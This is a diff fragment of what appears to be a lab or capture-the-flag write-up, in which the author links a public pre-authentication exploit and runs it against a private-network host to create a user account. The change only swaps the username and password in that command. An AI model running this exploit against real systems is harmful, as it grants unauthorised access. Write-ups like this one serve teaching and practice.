@@ -37,7 +37,7 @@ ID	Response   Lines      Word         Chars          Request
 <p>Found the exploit ... a pre-authentication one, wow. o.o !!
 <a href="https://www.exploit-db.com/exploits/34992/">the exploit</a>
 {% highlight bash %}
-python 34992.py  -t http://192.168.1.88 -u impious -p impious
+python 34992.py  -t http://192.168.1.88 -u estafermo -p estafermo
 {% endhighlight %}
 <p>User created.
 
